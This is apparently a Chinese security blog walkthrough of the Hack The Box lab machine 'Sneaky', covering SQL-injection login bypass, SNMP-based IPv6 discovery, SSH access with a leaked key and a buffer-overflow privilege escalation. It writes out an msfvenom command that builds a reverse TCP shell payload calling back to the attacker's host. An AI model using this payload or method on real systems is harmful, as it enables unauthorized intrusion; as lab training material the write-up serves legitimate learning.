> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/nRD4DyJdCULXl_wqcWC1Cw)

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **102** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_png/QkjvmbC1CD0zJ9hBlrElSv4ZqETGn3otgH8VHW1QuoOec3JMAbUyr0iaurJy4DPHBwUsDXiadJ3aha4CvJwyYVew/640?wx_fmt=png)

靶机地址：https://www.hackthebox.eu/home/machines/profile/19

靶机难度：中级（5.0/10）

靶机发布日期：2017 年 10 月 29 日

靶机描述：

Sneaky, while not requiring many steps to complete, can be difficult for some users. It explores enumeration through SNMP and has a beginner level buffer overflow vulnerability which can be leveraged for privilege escalation.

请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/1prMbIpCa3humOrLAChJmsjMl4Kxia7vzrQE59ny2bGibWz5Cr8YzNvia9NXzt8O2jiclnVwHYxubpFU1Q6dX9FRCQ/640?wx_fmt=png)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_png/5PYA1G5YGGkjAN1M3sw2tjaT2EzjYhfiax6biaK6IUQxeAFY5cgZQtGqXrMp1oRbNic8EDqpxsg5BjArxBhibLM5XQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP2SlNI0o6bSAHl3LqgN91SjPJ499E66Veic6FPiaxUyUf7vDL7ibM2H7oqW9zU49bnmXW5AD78ARueA/640?wx_fmt=png)

可以看到靶机的 IP 是 10.10.10.20....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP2SlNI0o6bSAHl3LqgN91SibDibre11mlYviaBlq00EtzBjtxaJot7yaMcycjHYu7uiah2nhtLRhiasZw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP2SlNI0o6bSAHl3LqgN91S3PafYefzmR1vdsqohI4d3Nn0SEIuySotEXspWydVAhVt9pwnlRRP6g/640?wx_fmt=png)

Nmap 扫描仅发现开放了 Apache 和 SNMP 两个服务...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP2SlNI0o6bSAHl3LqgN91SibuM8qknKbrC3bGJal1mCZZ0NvWuXIDlenZzqwK9hgj7b1Opuuu5rog/640?wx_fmt=png)

80 端口上没什么可用的信息... 直接枚举爆破看看...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP2SlNI0o6bSAHl3LqgN91Sn88LbdzyC23MmNHjO8CAVEiakOaw8uqTwUI96DltYxfuVAmiaibE1ujlg/640?wx_fmt=png)

枚举发现了 dev 目录...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP2SlNI0o6bSAHl3LqgN91SjghJHhgK8eV7StBabo2oNONk2uq6Xf5KgJ9tBRib1AzMvjI4JNABiclg/640?wx_fmt=png)

dev 目录提供了此页面... 通过利用 burpsuit 拦截尝试 sql 注入枚举爆破...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP2SlNI0o6bSAHl3LqgN91SgLYkH9R7MnU0bdN7vXH6mFxuyY4yp2NC5UpUOM7x4vyM6WOnuvasKQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP2SlNI0o6bSAHl3LqgN91SicxneQDuRIU4tOLXZxJnRAROI1PWPQxrib9ibLVtwTq0oP9ficic5kpic7nw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP2SlNI0o6bSAHl3LqgN91SIwtdGPCSr84dA3ibsdep7BdRjjIib5MTCl2nhyKG03oc68qeRY1nL0Aw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP2SlNI0o6bSAHl3LqgN91SooIGfu55IcM97EH6mGRS9l0FsyibpeObo1VVH06GJvXav12icGdQoSQg/640?wx_fmt=png)

可看到通过尝试通用的 sql 注入代码... 成功登录...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP2SlNI0o6bSAHl3LqgN91SMGaiauk3f1X3mWtUEg8NiaFEWI4QNcGM9pq120FLzrZ1wBWqKF5zNdIQ/640?wx_fmt=png)

登录后获得了两个用户名信息：

```
admin和thrasivoulos
```

以及 rsa 的 key，这里很熟悉吧... 就在前面两三章就做了两次一模一样的环境...

思路就是利用 rsa 的 key 通过 ssh 服务访问到用户... 从而在用户提权 root... 但是 nmap 只发现开放了 http 和 snmp 服务... 未开放 ssh 服务？？

这里熟悉的小伙伴就知道，snmp 关联着 ipv6 信息... 可以参考：

```
https://www.jianshu.com/p/dc2dc0222940
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP2SlNI0o6bSAHl3LqgN91SqaFkVm8hGSGUpa0szSGMyfKMvibU5Nwl74sGZmPNhlrBnlsazOcSkBA/640?wx_fmt=png)

将 key 保存到本地...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP2SlNI0o6bSAHl3LqgN91SBQoyE7z1lVqkoAcyAicOXZ0uNRYOO0EQwxaYkz9tKibocoyeOpNicv49A/640?wx_fmt=png)

利用 snmpwalk 命令来和 snmp 主机进行交换数据...

可以看到存在可用的 IPv6 接口信息... 需要获得靶机的 ipv6 信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP2SlNI0o6bSAHl3LqgN91SD5g4NtGpP0Jg1ornGWOq7RgRPQa5kDJbnSylMMDcEIYnLzDhYqgvibA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP2SlNI0o6bSAHl3LqgN91S1zFVryGIvWjmgUricPTrxX6jkD5Zk65ZxrcKWGVznRKMNJJnbj9FMicw/640?wx_fmt=png)

可以看到 Enyx 专门用来获取 ipv6 的信息工具... 利用即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP2SlNI0o6bSAHl3LqgN91SsPqWfR5GJTbGxIDJ3HLAv2zc3JJibHHJHRwdLvdhPr0qAFqCJRXPuTw/640?wx_fmt=png)

通过利用 enyx 获取了所有接口的 ipv6 信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP2SlNI0o6bSAHl3LqgN91S7lPGokO0ibqdsoh6NK0Dvb3ic22aiaZeTWUujEEnsK2GpibBAMD0NAORIA/640?wx_fmt=png)

检查发现...nmap 扫描 IPv6 信息对方是开启了 ssh 的... 那这就直接登录即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP2SlNI0o6bSAHl3LqgN91SrDaPXdfYYCbHFGbXXNCPuMjD2XNX6aBPWCN91LCLcE3tJCmicqSbbXw/640?wx_fmt=png)

直接利用前面获取的信息量... 成功登录了，并获得了 user 信息...（这里就不多说了，连续靶机都是类似环境）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP2SlNI0o6bSAHl3LqgN91SyTM5lfnD6GYLRibRxQIorqYStwZON86kqYAbnDhLtOib2uR0DwvHibHfw/640?wx_fmt=png)

直接通过 LinEnum.sh 枚举所有信息量...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP2SlNI0o6bSAHl3LqgN91SENReujFBx8jkyVOI4pslRdyyR8KeoFbuMh8UreUDRaxTCL14kOOs8g/640?wx_fmt=png)

在查看到 SUID 位时，resrwsr 的 chal 程序存在异常... 应该是缓冲区溢出提权了...（这里环境和前面一台靶机差不多... 雷同，那台也是 ssh 登录后缓冲区溢出提权.. 那台是可以直接利用 / bin/sh 写入程序直接获得 root...）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP2SlNI0o6bSAHl3LqgN91SmWFWESyBvBo0Fq0rjYoh2RgLbKxh5kXjTLvWuDZJenxgrwIZduvtNQ/640?wx_fmt=png)

下载到本地分析...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP2SlNI0o6bSAHl3LqgN91S4neBmtSVfMOOva7lgKsj7n91T1LNBV0YY12zLJgE4HGchG1EoKzeWg/640?wx_fmt=png)

这里直接快速了... 做了太多缓冲区溢出了... 获得了偏移量 362...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP2SlNI0o6bSAHl3LqgN91Srz0Pbt43ShhrY0y2DbRUNEdWCW14k5zdDAMezJC2A3TqcIuNA12XNw/640?wx_fmt=png)

```
msfvenom -a x86 --platform -linux -p linux/x86/shell_reverse_tcp LHOST=10.10.14.51 LPORT=6666 -e x86/alpha_mixed -f python
```

这里我利用了 msf 生成的 shell... 也可以利用原生的 shell 简单... 很多 shell 自行 google

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP2SlNI0o6bSAHl3LqgN91SAOgN2xSpKrWibEDDA5SNOFNq4fmxRqO84yCkXdjjx8rP0hErSXhGh7Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP2SlNI0o6bSAHl3LqgN91S2tndz2jf4rgPImANSXcqBOass7vtzrJtfWibvpQIDl9soddmD8PvHSg/640?wx_fmt=png)

知道偏移量，在获取 EIP 即可提权... 这里我编写的简单 shell 脚本 nop 是 x90，直接对程序 x/100x $esp-200 发现了很多可以利用的 EIP，这里的都可以利用... 直接写入...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KP2SlNI0o6bSAHl3LqgN91SpdpUiaRTBMPrJcXkuJgOOcfwoIx9ibEoaTJDVVmQKQ8nG9UxjxrwYEicg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3o0KfEJBubprpFZq7LUo4fMqYMibzRyWHAhch6SSt5O1C9iaJM8DjvdqI6ia6G5ASibnk9t5eqia75x7xOYE6ZcK1Mw/640?wx_fmt=png)

这里我利用了 788 的 EIP，别的也试过也成功... 或者不需要 NOP 的情况直接 google /bin/sh 源直接利用原生 EIP 提权也行...

成功注入 shell 提权 root，获得了 root.txt 信息...

由于我们已经成功得到 root 权限查看 user 和 root.txt，因此完成这台中级的靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/JVBXN9dKPiaPX1yX1KISqoLbnBqLd7swsSoseicbJFNXQVobDiam5cf5fbLib7LhsDggALPut4fGxxz4qnJDXeicf7g/640?wx_fmt=png)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

随缘收徒中~~ **随缘收徒中~~** **随缘收徒中~~**

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)